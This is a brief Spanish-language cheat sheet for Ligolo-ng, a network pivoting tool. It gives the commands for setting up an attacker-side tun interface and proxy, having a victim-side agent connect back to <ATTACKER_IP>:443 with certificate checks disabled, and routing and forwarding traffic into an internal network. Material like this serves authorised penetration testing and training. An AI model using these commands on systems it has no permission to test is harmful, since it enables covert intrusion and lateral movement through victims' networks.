# Ligolo-ng Cheat Sheet

#### Crear interfaz en equipo atacante
```
sudo ip tuntap add user <YOUR_USERNAME> mode tun ligolo
sudo ip link set ligolo up
```

#### Ejecutar ligolo en equipo atacante y ponerse en escucha en el puerto 443
```
ligolo-proxy -selfcert -laddr 0.0.0.0:443
```

#### Conectarse a máquina victima
```
ligolo-agent -connect <ATTACKER_IP>:443 -ignore-cert
```

#### Agregar la red destino a la que queremos pivotar para alcanzar otros hotst
```
sudo ip route add 192.168.1.0/24 dev ligolo
```

#### Visualizar y seleccionar las sesiones que estan establecidas
```
>> session
```

#### Iniciar una sesión y en la pregunta responder con 'yes'
```
>> start
```

#### Crear un socket TCP de escucha el agente en puerto 1234 para redirigir las conexiones al puerto 4321 del servidor proxy
```
>> listener_add --addr 0.0.0.0:1234 --to 127.0.0.1:4321 --tcp
```


---

[:arrow_left: Regresar](https://github.com/m4lal0/cheatsheets)